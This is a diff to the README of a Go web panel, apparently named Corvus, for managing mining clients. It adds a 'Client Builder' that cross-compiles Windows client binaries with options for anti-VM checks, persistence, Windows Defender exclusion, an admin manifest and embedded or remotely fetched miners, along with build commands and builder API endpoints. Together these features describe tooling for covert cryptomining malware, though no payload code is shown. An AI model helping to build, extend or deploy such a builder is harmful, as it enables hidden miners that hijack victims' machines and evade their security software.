@@ -7,6 +7,7 @@ A modern web-based control panel for managing mining operations, built with Go a
 - **Dashboard**: Real-time overview of mining operations and statistics
 - **Miner Management**: Add, remove, and monitor mining devices
 - **Configuration**: Centralized settings for pool connection and mining parameters
+- **Client Builder**: Cross-compile client binaries with per-build settings straight from the panel
 - **Responsive Design**: Works seamlessly on desktop and mobile devices
 - **RESTful API**: JSON endpoints for programmatic access
 - **Real-time Updates**: Dynamic data refresh without page reloads
@@ -18,7 +19,8 @@ Panel/
 ├── main.go                 # Application entry point
 ├── go.mod                  # Go module dependencies
 ├── handlers/
-│   └── handlers.go        # HTTP request handlers
+│   ├── handlers.go        # HTTP request handlers
+│   └── builder.go         # Client builder endpoint (drives BuilderCLI)
 ├── models/
 │   └── models.go          # Data models (Miner, Config)
 ├── database/
@@ -27,7 +29,8 @@ Panel/
 │   ├── layout.html        # Base template
 │   ├── dashboard.html     # Dashboard page
 │   ├── miners.html        # Miner management page
-│   └── config.html        # Configuration page
+│   ├── config.html        # Configuration page
+│   └── builder.html       # Client builder page
 ├── static/
 │   ├── css/
 │   │   └── style.css      # Stylesheet
@@ -120,6 +123,39 @@ Navigate to `/config` to:
 - Enable/disable SSL/TLS
 - Adjust update intervals
 
+### Client Builder
+Navigate to `/builder` to cross-compile a client binary on the panel host:
+- Set the panel URL(s), a config GET URL, or a contract address
+- Toggle anti-VM, persistence, debug console, admin manifest, Defender exclusion, remote miners
+- Choose the embedded miners (CPU/GPU) and fallback config
+- Build, then download or delete artifacts from the build list
+- **Remote miners** still embed the checked CPU/GPU miners as an offline fallback; uncheck
+  *Embed miners as offline fallback* to build a small download-only binary
+
+The panel runs the Linux CLI builder from `BuilderCLI`. Build it once with:
+
+```bash
+cd BuilderCLI
+go build -trimpath -ldflags="-s -w" -o ../builder .
+```
+
+The panel needs `cmake` and `mingw-w64` on the host, plus the `Client/` sources.
+Override the discovery with `CORVUS_BUILDER` (path to the builder executable) and
+`CORVUS_CLIENT_SOURCE` (path to `Client/`) if the panel is deployed elsewhere.
+
+The backend is chosen per host:
+
+| Host | Backend | Requirements |
+|------|---------|--------------|
+| Linux/macOS | `builder` (BuilderCLI) | `cmake`, `mingw-w64`; build it with `cd BuilderCLI && go build -o ../builder .` |
+| Windows | `Builder/build.ps1` (non-interactive, JSON output) | PowerShell, `cmake`, MinGW (`gcc`, `g++`, `windres`, `mingw32-make`) on `PATH` |
+
+On Windows the panel writes a temporary build spec and runs
+`powershell -ExecutionPolicy Bypass -File Builder/build.ps1 -panel_config <spec> -json`;
+`build.ps1` stages the sources in `%TEMP%`, so the repository is never modified.
+Overrides: `CORVUS_BUILD_SCRIPT` (path to `build.ps1`) and `CORVUS_BUILDER` (force the
+CLI backend on any host).
+
 ## API Endpoints
 
 ### Miners
@@ -131,10 +167,16 @@ Navigate to `/config` to:
 - `GET /api/config/get` - Get current configuration
 - `POST /api/config/update` - Update configuration
 
+### Builder
+- `POST /api/build` - Cross-compile a client binary (JSON body, returns artifact metadata)
+- `GET /api/builds` - List built binaries
+- `POST /api/builds/delete` - Delete a built binary (`{"filename": "corvus_123.exe"}`)
+
 ### Pages
 - `GET /` - Dashboard
 - `GET /miners` - Miner list page
 - `GET /config` - Configuration page
+- `GET /builder` - Client builder page
 
 ## Database Schema
 
